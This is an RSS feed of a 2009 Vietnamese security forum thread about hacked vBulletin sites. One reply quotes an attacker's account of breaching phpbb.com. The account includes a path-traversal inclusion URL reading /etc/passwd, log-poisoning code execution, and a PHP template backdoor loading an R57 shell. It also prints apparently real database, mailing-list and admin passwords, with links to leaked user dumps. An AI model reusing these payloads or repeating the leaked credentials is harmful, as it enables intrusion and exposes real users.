@@ -1,0 +1,170 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "VBB đang có bug?"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/8.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "VBB đang có bug?"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>VBB đang có bug?</title>
+				<description><![CDATA[ Không biết có phải vbb 3.8 đang có bug gì không mà mình thấy 1 số site đang sử dụng đồng loạt bị hack trong mấy ngày qua, đặc biệt là 2 site chuyên về vbb là vietvbb.vn và hoiquantinhoc.com. Mình không biết có phải vbb đang có bug gì hay không? Nếu bạn nào thường xuyên update các bug news có thể chỉ giùm chút được không vì mình cũng đang dùng vbb, và 1 trong 2 cái mình làm cho trường cấp 3 dùng 3.7.4 mới bị chiếm quyền admin hôm qua và mới giành lại, hiện đang khóa tạm thời để xem thế nào?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/27692.hva#169448</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/27692.hva#169448</link>
+				<pubDate><![CDATA[Sat, 14 Feb 2009 18:17:03]]> GMT</pubDate>
+				<author><![CDATA[ alexnguyen]]></author>
+			</item>
+			<item>
+				<title>Re: VBB đang có bug?</title>
+				<description><![CDATA[ Thông tin này có thể có ích cho bạn. 
+
+Website mã nguồn mở<span class="link"> http://www.phpbb.com</span> đã bị hack vào tuần vừa rồi.
+Đây là thông báo lỗi từ quản trị Website:
+
+<blockquote>
+Maintenance
+
+We are sorry to report that we have been attacked through a vulnerability in an outdated PHPList installation. phpBB.com and related sites will remain unavailable while we work to recover. No vulnerabilities have been found in the phpBB software itself.
+
+You can download phpBB here:<span class="link"> http://www.ohloh.net/p/phpbb</span>
+
+You can get support at the temporary support forums or on IRC: chat.freenode.net #phpbb
+
+– the phpBB team
+&nbsp;
+		</blockquote>
+
+Giao diện website bị lỗi:
+
+<blockquote><span class="link"> http://www.phpbb.com/index.php</span>
+&nbsp;
+		</blockquote>
+
+Đây là miêu tả các bước hack của hacker:
+
+
+<blockquote><span class="link"> http://www.milw0rm.com/exploits/7778</span> I then remembered that phpbb.com was running PHPlist and went looking through my email to find the link to the script’s location. So I went to phpbb.com/lists and sure enough they were running a vulnerable version. Next I enabled my favorite program proxy program and tried<span class="link"> http://www.phpbb.com/lists/admin/index.php?_SERVER</span>[ConfigFile]=../../../../../../etc/passwd and sure enough it included the etc/passwd
+<span class="link"> http://hackedphpbb.pastebin.com/f70f8bcaf</span><span class="link"> http://rapidshare.com/files/192159914/etc.txt</span>
+
+So I moved on to /etc/httpd/conf/httpd.conf<span class="link"> http://rapidshare.com/files/192163061/httpd.txt</span><span class="link"> http://hackedphpbb.pastebin.com/d29d8d4c7</span>
+
+And eventually found my way to their error log /home/logs/phpbb.com/error_log. After a little looking I figured out that their forums were running off /home/virtual/phpbb.com/community/ well it has been known for some time that you can include code in the error log. So I wanted to run some code, well in PHPBB3 the avatars are located in a folder called /home/virtual/phpbb.com/community/images/avatars/upload and your avatar is called (secret hash)_userid.jpg. But I didn’t know what the secret has was to include my picture (that had my own code in it) so by using the error log I injected code
+And figured out that their hash is f51ee61fe7a83fdf72780912bced0855. So now every time I want to upload run code against the server I can include this: /../../../../../../home/virtual/phpbb.com/community/images/avatars/upload/f51ee61fe7a83fdf72780912bced0855_ID.jpg
+
+So my first avatar was something simple and I wanted to see if phpbb kept their config file in plain text so cat /home/virtual/phpbb.com/community/config.php and sure enough, its in plain text.
+$dbms = 'mysqli';
+$dbhost = 'phpbb.db.osuosl.org';
+$dbport = '';
+$dbname = 'phpbb';
+$dbuser = 'phpbb2';
+$dbpasswd = 'saxM9nfRjLbJ2Yy5';
+$table_prefix = 'community_';
+
+While I was at it I checked out the config for PHPlist and it was also in plain text:
+$database_host = "localhost";
+$database_name = "phpbb_phplist";
+$database_user = 'phplist';
+$database_password = 'Berti3_Danc3';
+
+So I started running commands and found out that I can upload a php text file on the forums and by finding where the path it was stored I was able to get around their 14kb restrictions on avatars and a lot easier than editing images with edjpgcom. So doing a mysql dump of the phplist_admin table it showed in plain text that the password for the one admin account was phpbb_n3ws and the login was phpBB. Wow I am shocked no one brute forced this. So I login and see what I can come across, wow 400,000 registered emails, I’m sure that will go quick on the black market, sorry people but expect a lot of spam. After trying to modify the files that were stored in PHPlist I gave up and moved on to the forums. But not before dumping the PHPlist emails here:<span class="link"> http://rapidshare.com/files/192305758/out.txt</span>
+
+On the phpbb forums it states it has 200,000 members, but due to them constantly getting spammed they have well over 400,000 accounts. I started dumping the community_users table with their user_id, username and user_password. PHPBB stores their user’s passwords in unsalted md5 and their admin’s passwords in some funky hash. But if you run your own forum and are an admin you can have your forums create the hash, and then you do an mysql update to one of the admin account’s and your in. Or if you change their password to yours you can use the recover password function. More to come from this later.
+
+So I wrote a script that submits via curl, the md5 hash to a website and then stores the successful result in my own mysql database. The total accounts cracked are: 28635. I could have continued cracking but it was getting boring. Here is a sql file of the cracked passwords. Warning, some of the user name’s aren’t right as I had to remove ticks and quotes for it to run in my script, so I included their user id so you can check their proper login name.<span class="link"> http://rapidshare.com/files/192304153/phpbb_users.sql</span>
+
+In gaining access to the admin panel of the forums, I was able to read staff forums and come across some interesting posts. I will share some with you.
+
+List passwords:
+TO try and make this easier, below is a list of the mailing list passwords I had, please update and add any others that you have
+
+captcha-commits@lists.phpbb.com 54a946c47dd434b2
+catdb-commits@lists.phpbb.com 6f543db8f086e11f
+convertors-commits@lists.phpbb.com c192b68baacc8842
+documentation-commits@lists.phpbb.com f85ffcdf9262420c
+easymod-commits@lists.phpbb.com 5db5bf75be85191b
+kbase-commits@lists.phpbb.com 7c843188ed2f6021
+modteam-commits@lists.phpbb.com 533aeefe56bfa30c
+prosilver-commits@lists.phpbb.com 859785a9cc724e03
+website-commits@lists.phpbb.com 3c79b9864ae5ce43
+phpbb-honey-commits@lists.phpbb.com 7e9563750650e4c4
+st-tool-commits@lists.phpbb.com 534d4a9b74bb77aa
+iit-track-commits@lists.phpbb.com 8f318ffd3a2067c8
+packagemanager-commits@lists.phpbb.com 81657892dddafdca
+moddocs-commits@lists.phpbb.com 85c837b7f78e5435
+
+Told you they were random Meik ;)
+
+edit by dhn: added website-commits
+edit by tm: added phpbb-honey-commits, st--tool-commits, iit-track-commits.
+
+8kg;rt7Xykjq
+
+That password should work for all mailing lists on code.phpbb.com.
+
+Emergency contacts and irc info:<span class="link"> http://hackedphpbb.pastebin.com/f1399b3e8</span>
+
+And then I remembered that the admin panel allows you to dump tables. So I dumped the users table which is accessible here:<span class="link"> http://rapidshare.com/files/192261517/backup_sql.gz</span>
+
+Next I enabled php in template files and added this bit of code to one of the templates:
+$ip=$_SERVER['REMOTE_ADDR']; if($ip == "x.x.x.x"){include("/home/virtual/phpbb.com/community/files/(myid)_82ec9f9eb80df2a16cc3638429631c9f");}
+
+Which happened to be a shell, R57shell actually. I then searched for a writable directory and created a php file and wrote the source code to that file. I cleaned up the template and settings and logs and left the forums to run the way they were.
+
+After searching around using the shell I came across the Blog settings:
+define('DB_NAME', 'wordpress'); // The name of the database
+define('DB_USER', 'blog'); // Your MySQL username
+define('DB_PASSWORD', 'htsCCvyCnt5jPYMx'); // ...and password
+define('DB_HOST', 'localhost'); // 99% chance you won't need to change this value
+define('DB_CHARSET', 'utf8');
+define('DB_COLLATE', '');
+
+And now it comes to an end, you may ask why did I do this? For fun mainly, but what I would like to suggest to the team at phpbb is this. If you are going to run third party scripts, either integrate them or keep up to date on their patches. (even though the patch wasn’t released for 2 weeks). Also don’t allow admin’s to recover their passwords, they should have to contact another admin. Another item, doesn’t keep plain text files of passwords or in the database plain text passwords.
+
+I know this isn’t the best read, but it is very hard to look back on everything you did over the course of a few weeks. But hopefully I can now sleep better knowing that I am not worrying about the next way to break in. 
+&nbsp;
+		</blockquote>
+
+Đây chính là Blog của hacker đăng bài:
+<blockquote><span class="link"> http://hackedphpbb.blogspot.com/</span>
+&nbsp;
+		</blockquote>
+
+NGUỒN:<span class="link"> http://quantripro.com/forum/showthread.php?p=3967#post3967</span>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/27692.hva#169464</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/27692.hva#169464</link>
+				<pubDate><![CDATA[Sat, 14 Feb 2009 19:46:59]]> GMT</pubDate>
+				<author><![CDATA[ livemotion]]></author>
+			</item>
+			<item>
+				<title>Re: VBB đang có bug?</title>
+				<description><![CDATA[ May site của mình chưa up lên nếu hem...]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/27692.hva#169466</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/27692.hva#169466</link>
+				<pubDate><![CDATA[Sat, 14 Feb 2009 19:58:56]]> GMT</pubDate>
+				<author><![CDATA[ huynhvinh]]></author>
+			</item>
+			<item>
+				<title>Re: VBB đang có bug?</title>
+				<description><![CDATA[ Theo mình nghĩ các mã nguồn thường hay có bug, nếu ta xài thì chịu khó cập nhật các bảng vá lỗi của nó là ok.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/27692.hva#169539</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/27692.hva#169539</link>
+				<pubDate><![CDATA[Sun, 15 Feb 2009 11:24:42]]> GMT</pubDate>
+				<author><![CDATA[ livemotion]]></author>
+			</item>
+			<item>
+				<title>Re: VBB đang có bug?</title>
+				<description><![CDATA[ các lỗi càng ngày càng phát hiện nhiều ai mà biết được nó bị lỗi chỗ nào mà chống]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/27692.hva#169555</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/27692.hva#169555</link>
+				<pubDate><![CDATA[Sun, 15 Feb 2009 14:42:02]]> GMT</pubDate>
+				<author><![CDATA[ pdtg50]]></author>
+			</item>
+			<item>
+				<title>Re: VBB đang có bug?</title>
+				<description><![CDATA[ vietvbb.vn và HQTH hình như đều bị local thì phải quen mấy người ở HQTH thấy bảo hình như dạo HQTH va vietvbb đang đánh nhau ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/27692.hva#171162</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/27692.hva#171162</link>
+				<pubDate><![CDATA[Thu, 26 Feb 2009 17:08:25]]> GMT</pubDate>
+				<author><![CDATA[ anhyeutrinh]]></author>
+			</item>
+	</channel>
+</rss>
